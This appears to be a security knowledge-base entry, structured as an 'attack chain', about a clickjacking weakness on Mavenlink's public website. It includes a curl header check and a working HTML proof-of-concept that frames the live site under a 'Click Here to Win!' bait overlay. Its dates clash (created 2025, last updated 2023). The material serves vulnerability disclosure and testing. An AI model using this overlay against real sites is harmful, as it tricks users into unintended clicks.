---
tags:
  - clickjacking
  - ui-redressing
  - web-vulnerability
  - iframe
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-check-headers]]'
platforms:
  - Web
complexity: low
procedures:
  - '[[procedures/Test-for-Clickjacking-Vulnerability]]'
  - '[[procedures/Create-Clickjacking-Proof-of-Concept]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Demonstrates discovery and proof-of-concept for clickjacking vulnerability on
  Mavenlink's main website, allowing embedding in iframes without frame
  protections.
skill_level: intermediate
impact_level: medium
id: 4a52408a-6174-4130-9ddc-5f2b65ebc443
created_at: '2025-12-14T17:28:05.196Z'
updated_at: '2025-12-14T17:28:05.196Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Clickjacking UI Redressing on Mavenlink Website

Multi-stage attack chain demonstrating the discovery and exploitation of a clickjacking vulnerability on https://www.mavenlink.com/, where the absence of X-Frame-Options headers allows the site to be embedded in iframes from external domains, enabling UI redressing attacks to trick users into unintended actions.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | Medium |

## Attack Flow Visualization

```mermaid
graph LR
    A[Discovery] --> B[Proof-of-Concept Demonstration]
    B --> C[Potential Exploitation]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- Web browser for manual testing
- Text editor for creating HTML PoC

### Target Environment

- Target: Public-facing web application (e.g., https://www.mavenlink.com/)
- Required services/ports: HTTP/HTTPS on port 80/443
- Network access requirements: Internet access to the target site

### Initial Access Requirements

- No credentials required
- External network position (no internal access needed)
- Prior access: None

## Detailed Attack Procedures

### Step 1: Discover Clickjacking Vulnerability
procedure: [[procedures/Test-for-Clickjacking-Vulnerability]]

**Objective**: Verify if the target website can be embedded in an iframe without frame-busting protections, confirming the absence of headers like X-Frame-Options.

**Instructions**: Use [[commands/curl-check-headers]] to inspect the HTTP response headers of the target site:

```bash
curl -I https://www.mavenlink.com/
```

Look for the absence of `X-Frame-Options` or `Content-Security-Policy` frame-ancestors directives in the output. Then, manually test in a browser by creating a simple HTML page with an iframe sourcing the target URL and loading it locally to confirm embedding is possible.

**Expected Output**: HTTP headers without frame protection, and successful iframe embedding in browser without errors.

**Success Indicators**:
- No X-Frame-Options header present
- Site loads fully in an external iframe

### Step 2: Create and Test Proof-of-Concept
procedure: [[procedures/Create-Clickjacking-Proof-of-Concept]]

**Objective**: Develop an HTML page that embeds the vulnerable site in an iframe with overlay styling to demonstrate UI redressing, tricking users into clicking disguised elements.

**Instructions**: Create an HTML file (e.g., poc.html) with the following content:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe { position: absolute; top: 0; left: 0; opacity: 0.5; z-index: 1; }
        .overlay { position: absolute; top: 100px; left: 100px; z-index: 2; background: transparent; width: 200px; height: 50px; }
        .bait { background: red; color: white; text-align: center; line-height: 50px; }
    </style>
</head>
<body>
    <iframe src="https://www.mavenlink.com/"></iframe>
    <div class="overlay">
        <div class="bait">Click Here to Win!</div>
    </div>
    <script>
        window.onbeforeunload = function() { return "Are you sure?"; };
    </script>
</body>
</html>
```

Open the file in a browser to test. The semi-transparent iframe allows overlaying elements that align with sensitive buttons on the target site, such as login or action buttons.

**Expected Output**: The target site embeds successfully with overlay visible, demonstrating potential for user deception.

**Success Indicators**:
- Iframe loads without restrictions
- Overlay elements can be positioned over target UI components

## Attack Chain Summary

### Key Achievements

1. Confirmed lack of frame protections on Mavenlink's main site
2. Created a functional PoC demonstrating UI redressing
3. Highlighted risk of tricking authenticated users into unintended actions

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01*
